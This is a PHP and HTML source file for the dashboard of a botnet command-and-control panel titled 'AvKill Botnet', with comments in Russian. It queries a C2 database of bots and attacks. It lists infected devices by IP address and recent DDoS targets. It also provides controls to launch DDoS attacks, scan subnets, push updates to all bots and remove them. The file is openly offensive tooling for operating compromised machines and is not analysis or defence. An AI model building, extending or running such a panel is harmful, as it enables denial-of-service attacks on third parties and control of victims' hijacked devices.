<?php
session_start();
require_once 'auth.php';
checkAuth();

// Подключение к БД
$db = new SQLite3('../c2_server/c2.db');

// Статистика
$total_bots = $db->querySingle("SELECT COUNT(*) FROM bots");
$active_bots = $db->querySingle("SELECT COUNT(*) FROM bots WHERE is_active = 1");
$total_infected = $db->querySingle("SELECT SUM(infected) FROM bots");
$uptime_avg = $db->querySingle("SELECT AVG(uptime) FROM bots WHERE is_active = 1");

// Последние боты
$recent_bots = $db->query("SELECT ip, arch, os, infected, last_seen FROM bots ORDER BY last_seen DESC LIMIT 10");

// Последние атаки
$recent_attacks = $db->query("SELECT target, method, duration, started_at FROM attacks ORDER BY started_at DESC LIMIT 5");
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dashboard - AvKill Botnet</title>
    <link rel="stylesheet" href="style.css">
    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
</head>
<body>
    <?php include 'header.php'; ?>
    <?php include 'sidebar.php'; ?>
    
    <div class="content">
        <h1 class="neon-text">📊 Dashboard</h1>
        
        <!-- Статистика -->
        <div class="stats-grid">
            <div class="stat-card">
                <div class="stat-number"><?php echo $total_bots; ?></div>
                <div class="stat-label">Total Bots</div>
            </div>
            <div class="stat-card">
                <div class="stat-number"><?php echo $active_bots; ?></div>
                <div class="stat-label">Active Bots</div>
            </div>
            <div class="stat-card">
                <div class="stat-number"><?php echo $total_infected; ?></div>
                <div class="stat-label">Infected Devices</div>
            </div>
            <div class="stat-card">
                <div class="stat-number"><?php echo round($uptime_avg/3600, 1); ?>h</div>
                <div class="stat-label">Avg Uptime</div>
            </div>
        </div>
        
        <!-- Графики -->
        <div class="card">
            <h2>📈 Bot Activity</h2>
            <canvas id="botChart" width="400" height="200"></canvas>
        </div>
        
        <!-- Последние боты -->
        <div class="card">
            <h2>🤖 Recent Bots</h2>
            <div class="table-container">
                <table>
                    <thead>
                        <tr>
                            <th>IP Address</th>
                            <th>Architecture</th>
                            <th>OS</th>
                            <th>Infected</th>
                            <th>Last Seen</th>
                            <th>Status</th>
                        </tr>
                    </thead>
                    <tbody>
                        <?php while($row = $recent_bots->fetchArray()): ?>
                        <tr>
                            <td><?php echo htmlspecialchars($row['ip']); ?></td>
                            <td><span class="badge"><?php echo htmlspecialchars($row['arch']); ?></span></td>
                            <td><?php echo htmlspecialchars($row['os']); ?></td>
                            <td><?php echo $row['infected']; ?></td>
                            <td><?php echo date('Y-m-d H:i', $row['last_seen']); ?></td>
                            <td><span class="status active">🟢 Active</span></td>
                        </tr>
                        <?php endwhile; ?>
                    </tbody>
                </table>
            </div>
        </div>
        
        <!-- Быстрые действия -->
        <div class="card">
            <h2>⚡ Quick Actions</h2>
            <div style="display: flex; gap: 10px; flex-wrap: wrap;">
                <button class="btn" onclick="startDDOS()">
                    🚀 Start DDoS
                </button>
                <button class="btn" onclick="scanNetwork()">
                    🔍 Scan Network
                </button>
                <button class="btn" onclick="updateBots()">
                    🔄 Update All Bots
                </button>
                <button class="btn btn-red" onclick="killAll()">
                    ⚠️ Kill All Bots
                </button>
            </div>
        </div>
        
        <!-- Последние атаки -->
        <div class="card">
            <h2>⚔️ Recent Attacks</h2>
            <div class="table-container">
                <table>
                    <thead>
                        <tr>
                            <th>Target</th>
                            <th>Method</th>
                            <th>Duration</th>
                            <th>Started</th>
                            <th>Status</th>
                        </tr>
                    </thead>
                    <tbody>
                        <?php while($row = $recent_attacks->fetchArray()): ?>
                        <tr>
                            <td><?php echo htmlspecialchars($row['target']); ?></td>
                            <td><span class="method"><?php echo htmlspecialchars($row['method']); ?></span></td>
                            <td><?php echo $row['duration']; ?>s</td>
                            <td><?php echo date('H:i', $row['started_at']); ?></td>
                            <td><span class="status running">▶️ Running</span></td>
                        </tr>
                        <?php endwhile; ?>
                    </tbody>
                </table>
            </div>
        </div>
    </div>
    
    <script>
    // График активности
    const ctx = document.getElementById('botChart').getContext('2d');
    const botChart = new Chart(ctx, {
        type: 'line',
        data: {
            labels: ['00:00', '04:00', '08:00', '12:00', '16:00', '20:00'],
            datasets: [{
                label: 'Active Bots',
                data: [12, 19, 3, 5, 2, 3],
                borderColor: '#00ff00',
                backgroundColor: 'rgba(0, 255, 0, 0.1)',
                tension: 0.4
            }]
        },
        options: {
            responsive: true,
            plugins: {
                legend: {
                    labels: {
                        color: '#00ff00'
                    }
                }
            },
            scales: {
                y: {
                    beginAtZero: true,
                    grid: {
                        color: 'rgba(0, 255, 0, 0.1)'
                    },
                    ticks: {
                        color: '#00ff00'
                    }
                },
                x: {
                    grid: {
                        color: 'rgba(0, 255, 0, 0.1)'
                    },
                    ticks: {
                        color: '#00ff00'
                    }
                }
            }
        }
    });
    
    // Функции быстрых действий
    function startDDOS() {
        window.location.href = 'ddos.php';
    }
    
    function scanNetwork() {
        const subnet = prompt('Enter subnet to scan (e.g., 192.168.1.0/24):');
        if(subnet) {
            fetch('api.php?action=scan&subnet=' + encodeURIComponent(subnet))
                .then(response => response.json())
                .then(data => {
                    alert('Scan started: ' + data.message);
                });
        }
    }
    
    function updateBots() {
        if(confirm('Update all bots with latest version?')) {
            fetch('api.php?action=update')
                .then(response => response.json())
                .then(data => {
                    alert('Update command sent to all bots');
                });
        }
    }
    
    function killAll() {
        if(confirm('⚠️ DANGER! This will remove all bots. Continue?')) {
            fetch('api.php?action=kill')
                .then(response => response.json())
                .then(data => {
                    alert('Kill command sent');
                });
        }
    }
    
    // Авто-обновление
    setInterval(() => {
        fetch('api.php?action=stats')
            .then(response => response.json())
            .then(data => {
                // Обновляем статистику
                document.querySelectorAll('.stat-number')[0].innerText = data.total_bots;
                document.querySelectorAll('.stat-number')[1].innerText = data.active_bots;
            });
    }, 30000); // Каждые 30 секунд
    </script>
</body>
</html>